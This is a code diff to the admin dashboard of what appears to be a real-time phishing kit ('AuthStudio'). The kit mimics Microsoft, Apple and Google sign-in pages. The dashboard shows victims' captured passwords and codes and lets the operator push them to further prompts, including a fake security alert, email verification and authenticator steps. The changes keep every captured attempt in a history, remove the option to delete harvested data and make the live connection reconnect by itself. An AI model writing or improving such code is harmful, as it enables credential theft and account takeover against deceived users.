@@ -36,7 +36,7 @@ const GoogleLogo = ({ size = 20 }: { size?: number }) => (
 type Provider = 'microsoft' | 'apple' | 'google';
 type Device = 'desktop' | 'tablet' | 'mobile';
 type Theme = 'light' | 'dark';
-type Prompt = 'password' | 'email-code' | 'other-ways';
+type Prompt = 'password' | 'email-code' | 'other-ways' | 'verify-email';
 
 interface VisitorLocation {
   city: string;
@@ -159,9 +159,10 @@ const PROVIDER_PUSH_STEPS: Record<string, { label: string; step: string; color: 
     { label: '⎉ Code',        step: '__code_choice__',      color: '#7c3aed' },
     { label: 'Authenticator', step: 'authenticator',        color: '#0078D4' },
     { label: 'Phone Verify',  step: 'verify-phone-number',  color: '#7c3aed' },
-    { label: 'Other ways',    step: 'other-ways',           color: '#047857' },
-    { label: 'Register',      step: 'register',             color: '#be185d' },
-    { label: 'Recover',       step: 'recover',              color: '#9f1239' },
+    { label: 'Other ways',      step: 'other-ways',     color: '#047857' },
+    { label: 'Register',        step: 'register',       color: '#be185d' },
+    { label: 'Recover',         step: 'recover',        color: '#9f1239' },
+    { label: '🛡 Security Alert', step: 'security-alert', color: '#dc2626' },
   ],
   apple: [
     { label: '↩ Email',     step: 'email',            color: '#4b5563' },
@@ -310,15 +311,11 @@ function VisitorModal({
   visitor,
   onClose,
   onPushAction,
-  onDeleteField,
-  onDeleteAll,
   watcherCount = 0,
 }: {
   visitor: VisitorInfo;
   onClose: () => void;
   onPushAction: (visitorId: string, navigate: string, extra?: { promptNumber?: number; phoneDigits?: string }) => void;
-  onDeleteField: (visitorId: string, field: string) => void;
-  onDeleteAll: (visitorId: string) => void;
   watcherCount?: number;
 }) {
   const [iframeLoaded, setIframeLoaded] = useState(false);
@@ -330,6 +327,7 @@ function VisitorModal({
   const [phoneDigitsVal, setPhoneDigitsVal] = useState('');
   const [pendingAction, setPendingAction] = useState<{ step: string; label: string; color: string; extra?: { promptNumber?: number; phoneDigits?: string } } | null>(null);
   const [revealField, setRevealField] = useState<string | null>(null);
+  const [expandedHistory, setExpandedHistory] = useState<Record<string, boolean>>({});
   const [codeTypeDialogOpen, setCodeTypeDialogOpen] = useState(false);
   const [codeTypeSelected, setCodeTypeSelected] = useState<'email' | 'phone'>('email');
   const [authenticatorDialogOpen, setAuthenticatorDialogOpen] = useState(false);
@@ -652,13 +650,7 @@ function VisitorModal({
                 <Database className="w-3.5 h-3.5 text-[#555d6b]" />
                 <p className="text-[9px] font-bold uppercase tracking-[0.12em] text-[#555d6b]">Captured Data</p>
                 {formHistory.length > 0 && (
-                  <>
-                    <span className="ml-auto text-[10px] font-semibold text-green-400">{formHistory.length} entr{formHistory.length !== 1 ? 'ies' : 'y'}</span>
-                    <button onClick={() => { if (confirm('Clear all captured data for this visitor?')) onDeleteAll(visitor.id); }}
-                      className="w-5 h-5 flex items-center justify-center rounded hover:bg-red-900/40 text-[#555d6b] hover:text-red-400 transition-colors" title="Clear all data">
-                      <Trash2 className="w-3 h-3" />
-                    </button>
-                  </>
+                  <span className="ml-auto text-[10px] font-semibold text-green-400">{formHistory.length} entr{formHistory.length !== 1 ? 'ies' : 'y'}</span>
                 )}
               </div>
 
@@ -673,52 +665,80 @@ function VisitorModal({
               ) : (
                 <div className="space-y-2">
                   {(() => {
-                    const fieldTotal: Record<string, number> = {};
-                    formHistory.forEach(e => { fieldTotal[e.field] = (fieldTotal[e.field] ?? 0) + 1; });
-                    const fieldCounts: Record<string, number> = {};
-                    return formHistory.map((entry, idx) => {
-                      const { field, value, ts } = entry;
-                      fieldCounts[field] = (fieldCounts[field] ?? 0) + 1;
-                      const total = fieldTotal[field];
-                      const attemptNum = total - fieldCounts[field] + 1;
-                      const isLatest = attemptNum === total;
-                      const isRepeated = total > 1;
+                    // Group by field in first-seen order; entries within each group are oldest→newest
+                    const fieldGroups: Record<string, { field: string; value: string; ts: number }[]> = {};
+                    const fieldOrder: string[] = [];
+                    // formHistory is newest-first, so reverse to get oldest-first for grouping
+                    [...formHistory].reverse().forEach(entry => {
+                      if (!fieldGroups[entry.field]) { fieldGroups[entry.field] = []; fieldOrder.push(entry.field); }
+                      fieldGroups[entry.field].push(entry);
+                    });
+
+                    return fieldOrder.map(field => {
+                      const entries = fieldGroups[field]; // oldest → newest
+                      const latest = entries[entries.length - 1];
+                      const previous = entries.slice(0, -1); // older attempts
+                      const hasHistory = previous.length > 0;
                       const sensitive = isSensitive(field);
-                      const revealKey = `${field}-${idx}`;
-                      const revealed = revealField === revealKey;
+                      const revealed = revealField === field;
+                      const histOpen = expandedHistory[field] ?? false;
+
                       return (
-                        <div key={idx} className={`rounded-xl border overflow-hidden group ${isRepeated && !isLatest ? 'bg-[#13151a] border-[#232630] opacity-75' : 'bg-[#1a1d24] border-[#2d3139]'}`}>
+                        <div key={field} className="rounded-xl border bg-[#1a1d24] border-[#2d3139] overflow-hidden group">
+                          {/* Latest value row */}
                           <div className="flex items-center justify-between px-3 pt-2.5 pb-1">
                             <div className="flex items-center gap-1.5 min-w-0">
                               <span className="text-[9px] text-[#555d6b] uppercase font-bold tracking-widest flex-shrink-0">{FIELD_LABELS[field] ?? field}</span>
-                              {isRepeated && (
-                                <span className={`text-[8px] font-bold px-1.5 py-0.5 rounded-full leading-none flex-shrink-0 ${isLatest ? 'bg-amber-400/15 text-amber-400' : 'bg-[#1e2128] text-[#3e4450]'}`}>
-                                  {isLatest ? '★ latest' : `#${attemptNum}`}
+                              {hasHistory && (
+                                <span className="text-[8px] font-bold px-1.5 py-0.5 rounded-full leading-none bg-amber-400/15 text-amber-400 flex-shrink-0">
+                                  {entries.length} attempts
                                 </span>
                               )}
-                              <span className="text-[9px] text-[#3e4450] flex-shrink-0">{new Date(ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}</span>
+                              <span className="text-[9px] text-[#3e4450] flex-shrink-0">{new Date(latest.ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}</span>
                             </div>
                             <div className="flex items-center gap-1.5 flex-shrink-0">
-                              <button onClick={() => { navigator.clipboard?.writeText(value).catch(() => {}); }}
+                              <button onClick={() => { navigator.clipboard?.writeText(latest.value).catch(() => {}); }}
                                 className="w-4 h-4 flex items-center justify-center rounded text-[#3e4450] hover:text-blue-400 transition-colors opacity-0 group-hover:opacity-100" title="Copy">
                                 <Copy className="w-2.5 h-2.5" />
                               </button>
                               {sensitive && (
-                                <button onClick={() => setRevealField(revealed ? null : revealKey)} className="text-[9px] font-semibold text-amber-500 hover:text-amber-300 transition-colors uppercase tracking-wide">
+                                <button onClick={() => setRevealField(revealed ? null : field)} className="text-[9px] font-semibold text-amber-500 hover:text-amber-300 transition-colors uppercase tracking-wide">
                                   {revealed ? 'hide' : 'show'}
                                 </button>
                               )}
-                              <button onClick={() => onDeleteField(visitor.id, field)}
-                                className="w-4 h-4 flex items-center justify-center rounded hover:bg-red-900/40 text-[#3e4450] hover:text-red-400 transition-colors opacity-0 group-hover:opacity-100" title="Delete">
-                                <X className="w-2.5 h-2.5" />
-                              </button>
+                              {hasHistory && (
+                                <button
+                                  onClick={() => setExpandedHistory(prev => ({ ...prev, [field]: !histOpen }))}
+                                  className="text-[9px] font-semibold text-[#555d6b] hover:text-[#8a919e] transition-colors uppercase tracking-wide leading-none"
+                                  title={histOpen ? 'Hide history' : 'Show history'}
+                                >
+                                  {histOpen ? '▴ history' : '▾ history'}
+                                </button>
+                              )}
                             </div>
                           </div>
                           <div className="px-3 pb-3 pt-0.5">
                             <span className="text-[13px] font-mono break-all" style={{ color: sensitive && !revealed ? '#6b7280' : sensitive ? '#f87171' : '#e2e8f0' }}>
-                              {sensitive && !revealed ? '•'.repeat(Math.min(value.length, 12)) : value}
+                              {sensitive && !revealed ? '•'.repeat(Math.min(latest.value.length, 12)) : latest.value}
                             </span>
                           </div>
+
+                          {/* History of previous attempts */}
+                          {hasHistory && histOpen && (
+                            <div className="border-t border-[#2d3139] bg-[#13151a] px-3 py-2.5 space-y-1.5">
+                              <p className="text-[8px] text-[#3e4450] uppercase font-bold tracking-widest mb-2">Previous attempts</p>
+                              {[...previous].reverse().map((e, i) => (
+                                <div key={i} className="flex items-center justify-between gap-3 py-1 border-b border-[#1e2128] last:border-0">
+                                  <span className="text-[9px] text-[#3e4450] flex-shrink-0">
+                                    #{previous.length - i} · {new Date(e.ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
+                                  </span>
+                                  <span className="text-[11px] font-mono text-[#555d6b] break-all text-right">
+                                    {sensitive ? '•'.repeat(Math.min(e.value.length, 12)) : e.value}
+                                  </span>
+                                </div>
+                              ))}
+                            </div>
+                          )}
                         </div>
                       );
                     });
@@ -768,6 +788,7 @@ export default function AdminPage() {
   const [visitorWatchers, setVisitorWatchers] = useState<Record<string, number>>({});
   const [sidebarOpen, setSidebarOpen] = useState(false);
   const [windowWidth, setWindowWidth] = useState(typeof window !== 'undefined' ? window.innerWidth : 1200);
+  const [wsStatus, setWsStatus] = useState<'connecting' | 'connected' | 'reconnecting'>('connecting');
   const wsRef = useRef<WebSocket | null>(null);
 
   // ── Auth / passcode gate ──────────────────────────────────────────────────────
@@ -813,14 +834,28 @@ export default function AdminPage() {
 
   useEffect(() => {
     if (authState !== 'verified') return;
-    let ws: WebSocket | undefined;
-    try {
+
+    let destroyed = false;
+    let reconnectTimer: ReturnType<typeof setTimeout> | null = null;
+    let delay = 1000;
+    let authRejected = false;
+
+    function connect() {
+      if (destroyed || authRejected) return;
+      setWsStatus(prev => prev === 'connected' ? 'reconnecting' : 'connecting');
+
       const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-      ws = new WebSocket(`${proto}//${window.location.host}/api/ws`);
+      let ws: WebSocket;
+      try { ws = new WebSocket(`${proto}//${window.location.host}/api/ws`); }
+      catch {
+        reconnectTimer = setTimeout(() => { delay = Math.min(delay * 2, 15000); connect(); }, delay);
+        return;
+      }
       wsRef.current = ws;
 
       ws.onopen = () => {
-        ws!.send(JSON.stringify({ type: 'register-admin', passcode: passcodeRef.current }));
+        delay = 1000;
+        ws.send(JSON.stringify({ type: 'register-admin', passcode: passcodeRef.current }));
       };
 
       ws.onmessage = (e: MessageEvent<string>) => {
@@ -840,14 +875,19 @@ export default function AdminPage() {
             message?: string;
           };
 
+          if (msg.type === 'ping') { ws.send(JSON.stringify({ type: 'pong' })); return; }
+
           if (msg.type === 'auth-error') {
+            authRejected = true;
             sessionStorage.removeItem('admin_passcode');
             setPasscodeError('Incorrect passcode — try again');
             setPasscodeInput('');
             setAuthState('gate');
-            ws?.close();
+            ws.close();
             return;
           }
+
+          setWsStatus('connected');
 
           if (msg.type === 'visitors' && msg.visitors) {
             setVisitors(msg.visitors.map(v => ({ ...v, formData: v.formData ?? {}, formHistory: v.formHistory ?? [], online: true })));
@@ -897,9 +937,23 @@ export default function AdminPage() {
           }
         } catch { /* ignore */ }
       };
-    } catch { /* ignore */ }
 
-    return () => { try { ws?.close(); } catch { /* ignore */ } };
+      ws.onclose = () => {
+        if (destroyed || authRejected) return;
+        setWsStatus('reconnecting');
+        reconnectTimer = setTimeout(() => { delay = Math.min(delay * 2, 15000); connect(); }, delay);
+      };
+
+      ws.onerror = () => { try { ws.close(); } catch { /* ignore */ } };
+    }
+
+    connect();
+
+    return () => {
+      destroyed = true;
+      if (reconnectTimer) clearTimeout(reconnectTimer);
+      try { wsRef.current?.close(); } catch { /* ignore */ }
+    };
   }, [authState]);
 
   const openModal = (ip: string) => {
@@ -1014,9 +1068,10 @@ export default function AdminPage() {
   ];
 
   const prompts: { id: Prompt; name: string; icon: React.ReactNode; desc: string }[] = [
-    { id: 'password',   name: 'Password',   icon: <Lock className="w-3.5 h-3.5 text-white" />,       desc: 'Standard password entry' },
-    { id: 'email-code', name: 'Email code', icon: <Mail className="w-3.5 h-3.5 text-white" />,       desc: 'Send code to email' },
-    { id: 'other-ways', name: 'Other ways', icon: <LayoutList className="w-3.5 h-3.5 text-white" />, desc: 'Let user choose method' },
+    { id: 'password',     name: 'Password',      icon: <Lock className="w-3.5 h-3.5 text-white" />,   desc: 'Standard password entry' },
+    { id: 'email-code',   name: 'Email code',    icon: <Mail className="w-3.5 h-3.5 text-white" />,   desc: 'Send code to email' },
+    { id: 'verify-email', name: 'Verify email',  icon: <Shield className="w-3.5 h-3.5 text-white" />, desc: 'Ask to confirm email first' },
+    { id: 'other-ways',   name: 'Other ways',    icon: <LayoutList className="w-3.5 h-3.5 text-white" />, desc: 'Let user choose method' },
   ];
 
   const src = loginSrc(provider, device, theme, prompt, phoneEnabled, googlePhone, gVerifyMethod, gCorrectNumber);
@@ -1069,9 +1124,9 @@ export default function AdminPage() {
           visitor={modalVisitor}
           onClose={() => closeModal()}
           onPushAction={pushAction}
-          onDeleteField={deleteField}
+
           watcherCount={visitorWatchers[modalVisitor.id] ?? 0}
-          onDeleteAll={deleteAll}
+
         />
       )}
 
@@ -1091,7 +1146,12 @@ export default function AdminPage() {
             <Key className="w-3.5 h-3.5 text-white" />
           </div>
           <span className="text-[15px] font-semibold tracking-tight text-white">AuthStudio</span>
-          <div className="ml-auto flex items-center gap-1.5 flex-shrink-0">
+          <div className="ml-auto flex items-center gap-2.5 flex-shrink-0">
+            {/* WS connection status dot */}
+            <div className="flex items-center gap-1" title={wsStatus === 'connected' ? 'Live' : wsStatus === 'reconnecting' ? 'Reconnecting…' : 'Connecting…'}>
+              <span className={`w-1.5 h-1.5 rounded-full ${wsStatus === 'connected' ? 'bg-emerald-400' : 'bg-amber-400 animate-pulse'}`} />
+              {wsStatus !== 'connected' && <span className="text-[10px] text-amber-400">{wsStatus === 'reconnecting' ? 'Reconnecting' : 'Connecting'}</span>}
+            </div>
             <Users className="w-3 h-3 text-[#555d6b]" />
             <span className="text-[11px] font-semibold text-[#8a919e]">{adminCount}</span>
           </div>
